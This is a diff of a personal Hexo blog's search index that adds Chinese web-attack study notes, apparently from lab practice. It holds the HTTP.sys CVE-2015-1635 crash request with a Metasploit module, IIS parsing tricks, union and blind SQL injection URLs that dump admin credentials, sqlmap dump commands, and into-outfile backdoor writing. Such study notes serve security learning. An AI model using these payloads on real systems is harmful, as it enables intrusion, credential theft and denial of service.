@@ -1,6 +1,81 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hexo网站搭建和命令</title>
+    <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
+<!-- 每次备份Blog目录下的source，_config.yml，_config.flexblock.yml，_config.async.yml -->
+<!-- 重装的话在www目录下删除整个Blog文件夹，然后在www文件夹下cmd -->
+
+<ol>
+<li><p>WWW目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
+</li>
+<li><p>Blog目录下cmd</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
+</li>
+<li><p>上传github：<br>hexo clean<br>hexo g<br>hexo d<br>访问<a href="https://bosaisun.github.io/">Github 网址</a></p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>网站搭建</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ASP应用&amp;HTTP.SYS&amp;短文件&amp;文件解析&amp;Access注入&amp;数据库泄漏</title>
+    <url>/2024/03/14/Web%E6%94%BB%E9%98%B21/</url>
+    <content><![CDATA[<h2 id="ASP-默认安装-MDB数据库泄漏下载"><a href="#ASP-默认安装-MDB数据库泄漏下载" class="headerlink" title="ASP-默认安装-MDB数据库泄漏下载"></a>ASP-默认安装-MDB数据库泄漏下载</h2><p>由于大部分ASP程序与ACCESS数据库搭建，但ACCESS没有账号密码，无需连接，都在脚本文件中定义配置好数据库路径就可以用了，不需要额外配置安装数据库，所以大部分提前固定好的数据库路径如默认未修改，当攻击者知道数据库的完整路径，可远程下载后解数据实现攻击。例如早期的Windows 2003的fyblogs_3.0网站。<br><br></p>
+<h2 id="ASP-中间件-CVE-短文件-解析-写权限"><a href="#ASP-中间件-CVE-短文件-解析-写权限" class="headerlink" title="ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限"></a>ASP-中间件-CVE&amp;短文件&amp;解析&amp;写权限</h2><p><strong>HTTP.SYS（CVE-2015-1635）</strong></p>
+<ol>
+<li>漏洞描述<br>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。然后会直接蓝屏。</li>
+<li>影响版本<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</li>
+<li>漏洞利用条件<br>安装了IIS6.0以上的Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2版本</li>
+<li>漏洞复现<br>curl -v 192.168.126.130 -H “Host:192.168.126.130” -H “Range:bytes&#x3D;0-18446744073709551615”</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use auxiliary/dos/http/ms15_034_ulonglongadd</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.126.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<br>
+
+<p><strong>IIS短文件</strong></p>
+<ol>
+<li>此漏洞实际是由HTTP请求中旧DOS 8.3名称约定(SFN)的代字符(~)波浪号引起的。它允许远程攻击者在Web根目录下公开文件和前6位文件夹名称(不应该可被访问)。攻击者可以找到通常无法从外部直接访问的重要文件,并获取有关应用程序基础结构的信息。</li>
+<li>漏洞成因:<br>为了兼容16位MS-DOS程序,Windows为文件名较长的文件(和文件夹)生成了对应的windows 8.3短文件名。在Windows下查看对应的短文件名,可以使用命令dir &#x2F;x</li>
+<li>应用场景：<br>后台路径获取，数据库文件获取，其他敏感文件获取等</li>
+<li>利用工具：<br><a href="https://github.com/irsdl/IIS-ShortName-Scanner">IIS-ShortName-Scanner</a><br><a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a><br>
+<br></li>
+</ol>
+<p><strong>IIS文件解析</strong><br>IIS 6 解析漏洞<br>1.该版本默认会将1.asp;.jpg 此种格式的文件名，当成Asp解析<br>2.该版本默认会将1.asp文件名下的所有文件当成Asp解析<br>如：<br>logo.asp;.jpg<br>xx.asp&#x2F;logo.jpg<br><br></p>
+<p><strong>IIS 7.x 解析漏洞</strong><br>在一个文件路径(&#x2F;xx.jpg)后面加上&#x2F;xx.php会将&#x2F;xx.jpg&#x2F;xx.php 解析为php文件<br>应用场景：配合文件上传获取Webshell<br><br></p>
+<p><strong>IIS写权限</strong><br>IIS&lt;&#x3D;6.0，老漏洞，目录权限开启写入，开启WebDAV，设置为允许<br><a href="https://cloud.tencent.com/developer/article/2050105">参考利用</a><br><br></p>
+<h2 id="ASP-SQL注入-SQLMAP使用-ACCESS注入"><a href="#ASP-SQL注入-SQLMAP使用-ACCESS注入" class="headerlink" title="ASP-SQL注入-SQLMAP使用 &amp; ACCESS注入"></a>ASP-SQL注入-SQLMAP使用 &amp; ACCESS注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top 1 * from aboutusclass <span class="built_in">where</span> classid=<span class="string">&quot;&amp;classid&amp;&quot;</span> order by OrderID</span><br><span class="line"></span><br><span class="line"><span class="comment">## Pic.asp?classid=3带入</span></span><br><span class="line"><span class="keyword">select</span> top 1 * from aboutusclass <span class="built_in">where</span> classid=<span class="string">&quot;&amp;3&amp;&quot;</span> order by OrderID</span><br></pre></td></tr></table></figure>
+
+<p><strong>重新定义</strong>：SQL注入对用户的输入的数据没有过滤，导致重新定义SQL执行（攻击者定义想要的执行结果语句）由于这个SQL语句是在数据中执行，什么数据库什么SOL语句或有什么SOL执行功能，由数据库类型决定所以说为什么注入，要叫做数据库注入，要区分什么数据库。<br><br></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> top 1 * from aboutusclass <span class="built_in">where</span> classid=<span class="string">&quot;&amp;3&amp;&quot;</span> union <span class="keyword">select</span> <span class="comment">#&quot;&amp;&quot; order by OrderID</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="http://192.168.126.129:89/Pic.asp?classid=3">http://192.168.126.129:89/Pic.asp?classid=3</a> 正常</p>
+<p><a href="http://192.168.126.131:89/Pic.asp?classid=3dsad">http://192.168.126.131:89/Pic.asp?classid=3dsad</a> 错误</p>
+<p><a href="http://192.168.126.131:89/Pic.asp?classid=3dsaasdasdad">http://192.168.126.131:89/Pic.asp?classid=3dsaasdasdad</a> 错误</p>
+<p>证明可能有数据库注入漏洞，但是也有可是是容错页面404代码的逻辑设置<br><br></p>
+<p><strong>Access</strong><br>&nbsp;&nbsp;&nbsp;表名<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据</p>
+<br>
+
+<p>ACCESS数据库无管理帐号密码，顶级架构为表名，列名（字段），数据，所以在注入猜解中一般采用字典猜解表和列再获取数据，猜解简单但又可能出现猜解不到的情况，由于Access数据库在当前安全发展中已很少存在，故直接使用SQLMAP注入，后续再说其他。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.129:89/Pic.asp?classid=3&quot;</span> --tables //获取表名</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.129:89/Pic.asp?classid=3&quot;</span> --columns -T admin //获取admin表名下的列名</span><br><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.126.129:89/Pic.asp?classid=3&quot;</span> --dump -C <span class="string">&quot;&quot;</span> -T admin  //获取表名下的列名数据</span><br></pre></td></tr></table></figure>
+<br>
+
+<p><strong>目录扫描</strong>：字典去跑</p>
+<p><strong>IIS短文件</strong>：利用漏洞探针</p>
+<p><strong>网站爬虫</strong>：获取架构中的目录和文件路径进行分析</p>
+]]></content>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Markdown语法</title>
     <url>/2024/03/11/Markdown%E8%AF%AD%E6%B3%95/</url>
     <content><![CDATA[<h2 id="Markdown-官方教程"><a href="#Markdown-官方教程" class="headerlink" title="Markdown 官方教程"></a><a href="https://markdown.com.cn/cheat-sheet.html#%E6%80%BB%E8%A7%88">Markdown 官方教程</a></h2><table>
@@ -81,30 +156,118 @@
       </tags>
   </entry>
   <entry>
-    <title>Hexo网站搭建和命令</title>
-    <url>/2024/03/11/Hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/</url>
-    <content><![CDATA[<h2 id="Hexo搭建和命令参考"><a href="#Hexo搭建和命令参考" class="headerlink" title="Hexo搭建和命令参考"></a><a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">Hexo搭建和命令参考</a></h2><!-- 换新电脑参考上面网址 -->
-<!-- 每次备份Blog目录下的source，_config.yml，_config.flexblock.yml，_config.async.yml -->
-<!-- 重装的话在www目录下删除整个Blog文件夹，然后在www文件夹下cmd -->
-
-<ol>
-<li><p>WWW目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">hexo init Blog</span><br><span class="line"><span class="built_in">cd</span> Blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>复制备份的source，scaffolds，_config.yml，_config.flexblock.yml，_config.async.yml到Blog目录下<br>删除Blog目录下_config.landscape.yml和theme\flexblock目录下的_config.yml</p>
-</li>
-<li><p>Blog目录下cmd</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install --save hexo-renderer-less hexo-renderer-ejs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/miiiku/hexo-theme-flexblock.git ./themes/flexblock</span><br><span class="line">npm i hexo-theme-async@latest</span><br><span class="line">npm install hexo-helper-live2d</span><br><span class="line">npm install live2d-widget-model-hijiki</span><br><span class="line">npm install live2d-widget-model-wanko</span><br><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>访问本地：<br>hexo g<br>hexo s<br>访问<a href="http://localhost:4000/">本地 4000端口</a></p>
-</li>
-<li><p>上传github：<br>hexo clean<br>hexo g<br>hexo d<br>访问<a href="https://bosaisun.github.io/">Github 网址</a></p>
-</li>
+    <title>PHP应用&amp;MYSQL架构&amp;SQL注入&amp;跨库查询&amp;文件读写&amp;权限操作</title>
+    <url>/2024/03/15/Web%E6%94%BB%E9%98%B22/</url>
+    <content><![CDATA[<p><strong>Access无数据库用户</strong></p>
+<p>mysql里面有内置的管理用户，其中root就是默认数据库管理员用户</p>
+<p>网站上面的数据库都在mysql中，由root或一对一用户去管理<br><br></p>
+<p>接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理</p>
+<p><strong>攻击</strong>：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）</p>
+<p>SQL语句能干嘛 &#x3D; SQL语句由谁决定 &#x3D;&gt; 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)<br><br></p>
+<h2 id="MYSQL注入：（目的获取当前web权限）"><a href="#MYSQL注入：（目的获取当前web权限）" class="headerlink" title="MYSQL注入：（目的获取当前web权限）"></a>MYSQL注入：（目的获取当前web权限）</h2><ol>
+<li>判断数据库的常见四个信息（系统，用户，数据库名，版本）</li>
+<li>根据四个信息去选择方案</li>
 </ol>
+<p><strong>root用户</strong>：先测试读写，能够读写就直接写后门，不能的话就测试获取数据<br><strong>非root用户</strong>：直接测试获取数据<br><br></p>
+<h2 id="PHP-MYSQL-Web组成架构"><a href="#PHP-MYSQL-Web组成架构" class="headerlink" title="PHP-MYSQL-Web组成架构"></a>PHP-MYSQL-Web组成架构</h2><p>服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理<br>可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理</p>
+<ol>
+<li>统一交root用户管理<br><a href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; root &#x3D;&gt;MYSQL<br><a href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; root &#x3D;&gt;MYSQL<br></li>
+</ol>
+<p><strong>数据库统一管理（root用户）</strong><br>每个网站的数据库都由root用户统一管理<br><strong>网站A</strong>：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br><strong>网站B</strong>：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01<br><br></p>
+<p>Mysql<br>&nbsp;&nbsp;&nbsp;root(自带默认)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网站A  testA<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网站B  testB<br><br></p>
+<ol start="2">
+<li>一对一用户管理（推荐）<br><a href="http://www.zblog.com/">www.zblog.com</a>  &#x3D; zblog  &#x3D; zblog &#x3D;&gt;MYSQL<br><a href="http://www.demo01.com/">www.demo01.com</a> &#x3D; demo01 &#x3D; demo01 &#x3D;&gt;MYSQL<br>
+<br></li>
+</ol>
+<p><strong>数据库一对一管理（不同用户）</strong><br>自己的网站单独创建数据库用户去管理自己的数据库<br><strong>网站A</strong>：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库zblog用户  zblog<br><strong>网站B</strong>：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库demo用户  demo01<br><br></p>
+<p>Mysql<br>&nbsp;&nbsp;&nbsp;表名A<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名A（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据A<br>&nbsp;&nbsp;&nbsp;表名B<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名B（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据B<br><br></p>
+<p>Access（比Mysql低一级，只能有一个）<br>&nbsp;&nbsp;&nbsp;表名<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;列名（字段）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据</p>
+<br>
+
+<p><strong>目的</strong>：获取数据<br>肯定一步步得到信息，先数据库名，再表名，再列名<br><br></p>
+<h2 id="PHP-MYSQL-SQL常规查询"><a href="#PHP-MYSQL-SQL常规查询" class="headerlink" title="PHP-MYSQL-SQL常规查询"></a>PHP-MYSQL-SQL常规查询</h2><p><strong>SQL注入获取相关数据</strong>：</p>
+<ol>
+<li>数据库版本-看是否符合information_schema查询：version()</li>
+<li>数据库用户-看是否符合ROOT型注入攻击：user()</li>
+<li>当前操作系统-看是否支持大小写（Linux敏感）或文件路径选择：@@version_compile_os</li>
+<li>数据库名字-为后期猜解指定数据库下的表，列做准备：database()<br>
+<br></li>
+</ol>
+<p><strong>MYSQL5.0以上版本</strong>：自带的数据库名information_schema<br>information_schema：存储数据库下的数据库名及表名，列名信息的数据库<br>information_schema.schemata：记录数据库名信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息表<br><br><br>schema_name：information_schema.schemata记录的数据库名信息<br>table_schema：information_schema.tables记录的数据库名<br>table_name：information_schema.tables记录的表名<br>column_name：information_schema.columns记录的列名</p>
+<br>
+
+<p><strong>注入操作</strong>：</p>
+<ol>
+<li><p>为什么是6？是因为表里面有6个列，实战不知道，折中法慢慢试</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=1 order by 6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>页面显示了哪几个数字就是有注入点的地方，没出数字前面加-号可以让他出，显示了2,4,5之后都在这三个地方写注入代码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,5,6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>插入进去看数据库demo01，用户root@localhost</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,database(),user(),6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>插入进去看版本5.7.26，操作系统Win64</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,version(),@@version_compile_os,6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>数据库名之前已经知道了，现在需要知道下面有什么表，所以查询demo01下的表名,表名信息借助mysql自带的<br>information_schema.tables存储查询，加上group_concat，查询所有的，显示出三个表名admin,gbook,news</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,group_concat(table_name),5,6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>表名已经知道了，现在需要知道下面有什么列，所以查询admin下的表名）表名信息借助mysql自带的information_schema.columns存储查询，加上group_concat，查询所有的，显示出三个列名username,password,id</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_schema=<span class="string">&#x27;demo01&#x27;</span> and table_name=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>知道admin的列名信息，就到最后一步了，使用id&#x3D;1继续往下能获得更多账号密码</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="built_in">id</span>,3,username,password,6 from admin <span class="built_in">where</span> <span class="built_in">id</span>=1</span><br></pre></td></tr></table></figure></li>
+</ol>
+<br>
+
+<h2 id="PHP-MYSQL-SQL跨库查询"><a href="#PHP-MYSQL-SQL跨库查询" class="headerlink" title="PHP-MYSQL-SQL跨库查询"></a>PHP-MYSQL-SQL跨库查询</h2><p><strong>跨库查询</strong>：<br>只有数据库统一管理才会出现（root用户）<br>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01</p>
+<br>
+
+<p><strong>跨库注入</strong><br>通过B网站的注入点获取A网站的账号密码<br><br></p>
+<p><strong>影响条件</strong>：当前数据库ROOT用户权限<br>如果是注入的是root用户，root用户mysql拥有所有的数据库<br><br></p>
+<p>测试不同数据库用户：root demo<br><strong>跨库查询操作</strong>：</p>
+<ol>
+<li><p>查询所有的数据库名，得到所有的数据库表名之后</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查询数据库名zblog下面的表名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(table_name),6 from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>查询数据库名zblog下面的zbp_member列名</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,4,group_concat(column_name),6 from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;zbp_member&#x27;</span> and table_schema=<span class="string">&#x27;zblog&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>跨库查询需要加. 查询数据库名zblog下面的zbp_member列名下面的mem_Name和mem_Password</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>权限高可以跨库查看其他的库，权限低就只能查看自己的，使用user()来查看是否是root用户。而决定权取决于连接的服务器。<br><br></p>
+<h2 id="PHP-MYSQL-SQL文件读写"><a href="#PHP-MYSQL-SQL文件读写" class="headerlink" title="PHP-MYSQL-SQL文件读写"></a>PHP-MYSQL-SQL文件读写</h2><p><strong>影响条件</strong>：</p>
+<ol>
+<li>当前数据库用户权限需要root，高权限</li>
+<li>secure-file-priv设置<br>
+<br></li>
+</ol>
+<p><strong>PHP中间版本有，高版本就没有了</strong></p>
+<p>“D:\phpstudy_pro\Extensions\MySQL5.7.26\my.ini” 配置写入secure_file_priv&#x3D;才能出现此漏洞，删除secure_file_priv&#x3D;就没有这个漏洞了</p>
+<p>测试不同数据库用户：root demo</p>
+<ol>
+<li><p>尝试读取</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),3,4,5,6</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可以找到配置文件，写入后门到web里</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.0.1.139:81/new.php?<span class="built_in">id</span>=-1 union <span class="keyword">select</span> 1,<span class="string">&#x27;cypher&#x27;</span>,3,4,5,6 into outfile <span class="string">&#x27;d:\\2.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<br></li>
+</ol>
+<p><strong>读写的路径的问题</strong>：</p>
+<ol>
+<li>报错显示获取路径</li>
+<li>phpinfo页面泄漏<br>如果不知道路径思路：利用常见的默认的中间件，数据库等安装路径读取有价值信息<br>
+<br></li>
+</ol>
+<p><strong>单引号过滤绕过方式</strong><br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）</p>
 ]]></content>
-      <tags>
-        <tag>网站搭建</tag>
-      </tags>
+      <categories>
+        <category>Web攻防</category>
+      </categories>
   </entry>
   <entry>
     <title>PHP应用&amp;SQL注入&amp;符号拼接&amp;请求方法&amp;HTTP头&amp;JSON&amp;编码类</title>
@@ -170,6 +333,350 @@
 ]]></content>
       <categories>
         <category>Web攻防</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>PHP应用&amp;SQL盲注&amp;布尔回显&amp;延时判断&amp;报错处理&amp;增删改查方式</title>
+    <url>/2024/03/17/Web%E6%94%BB%E9%98%B24/</url>
+    <content><![CDATA[<h2 id="PHP-MYSQL-SQL操作-增删改查"><a href="#PHP-MYSQL-SQL操作-增删改查" class="headerlink" title="PHP-MYSQL-SQL操作-增删改查"></a>PHP-MYSQL-SQL操作-增删改查</h2><p>1、功能：数据查询<br>查询：SELECT * FROM news where id&#x3D;$id</p>
+<p>2、功能：新增用户，添加新闻等<br>增加：INSERT INTO news (列名) VALUES (数据)</p>
+<p>3、功能：删除用户，删除新闻等<br>删除：DELETE FROM news WHERE id&#x3D;$id</p>
+<p>4、功能：修改用户，修改文章等<br>修改：UPDATE news SET id&#x3D;$id</p>
+<h2 id="PHP-MYSQL-注入函数-布尔-报错-延迟"><a href="#PHP-MYSQL-注入函数-布尔-报错-延迟" class="headerlink" title="PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟"></a>PHP-MYSQL-注入函数-布尔&amp;报错&amp;延迟</h2><p>盲注就是在注入过程中，获取的数据不能回显至前端页面。<br>我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br>解决：常规的联合查询注入不行的情况</p>
+<p>我们可以知道盲注分为以下三类：<br>1、基于布尔的SQL盲注-逻辑判断<br>regexp,like,ascii,left,ord,mid</p>
+<p>2、基于时间的SQL盲注-延时判断<br>if,sleep</p>
+<p>3、基于报错的SQL盲注-报错回显<br>floor，updatexml，extractvalue</p>
+<p>延迟（注意and有时候执行不了改成or）：<br>and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br><a href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(left(database(),1)&#x3D;’d’,sleep(5),sleep(0));<br>如果数据库名demo01第一位等于d，所以延时5秒</p>
+<p>and if(length(database())&#x3D;6,sleep(5),sleep(0));<br><a href="http://10.0.1.139:82/new.php?id=1">http://10.0.1.139:82/new.php?id=1</a> and if(length(database())&#x3D;6,sleep(5),sleep(0));<br>如果数据库名demo01位数等于6，所以延时5秒</p>
+<p>布尔：<br>and length(database())&#x3D;7;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and length(database())&#x3D;7;<br>查询数据库demo01长度，是6位，等于7就没回显</p>
+<p>and left(database(),1)&#x3D;’p’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
+<p>and left(database(),2)&#x3D;’pi’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and left(database(),2)&#x3D;’pi’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，前两位等于de，所以没回显</p>
+<p>and substr(database(),1,1)&#x3D;’p’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),1,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第一位等于d，所以没回显</p>
+<p>and substr(database(),2,1)&#x3D;’i’;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and substr(database(),2,1)&#x3D;’p’;<br>查询数据库 left(a,b)从左侧截取a的前b位，demo01，第二位等于e，所以没有数据</p>
+<p>and ord(left(database(),1))&#x3D;112;<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and ord(left(database(),1))&#x3D;112;<br>适用的是ASCII码，防止引号过滤，11为p的ASCII码，查询数据库 left(a,b)从左侧截取a的前b位，demo01，前一位等于d，所以没回显</p>
+<p>报错：<br>and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)<br>updatexml 会触发一个 SQL 错误，从而报出错误</p>
+<p>and extractvalue(1, concat(0x5c, (select version())));<br><a href="http://10.0.1.139:82/sqli/new.php?id=1">http://10.0.1.139:82/sqli/new.php?id=1</a> and extractvalue(1, concat(0x5c, (select version())));<br>extractvalue 会触发一个 SQL 错误，从而报出错误</p>
+<p>更多：<a href="https://www.jianshu.com/p/bc35f8dd4f7c">https://www.jianshu.com/p/bc35f8dd4f7c</a></p>
+<p>参考：<br>like ‘ro%’            #判断ro或ro…是否成立<br>regexp ‘^xiaodi[a-z]’ #匹配xiaodi及xiaodi…等<br>if(条件,5,0)          #条件成立 返回5 反之 返回0<br>sleep(5)              #SQL语句延时执行5秒<br>mid(a,b,c)            #从位置b开始，截取a字符串的c位<br>substr(a,b,c)         #从位置b开始，截取字符串a的c长度<br>left(database(),1)，database() #left(a,b)从左侧截取a的前b位<br>length(database())&#x3D;8  #判断数据库database()名的长度<br>ord&#x3D;ascii ascii(x)&#x3D;97 #判断x的ascii码是否等于97</p>
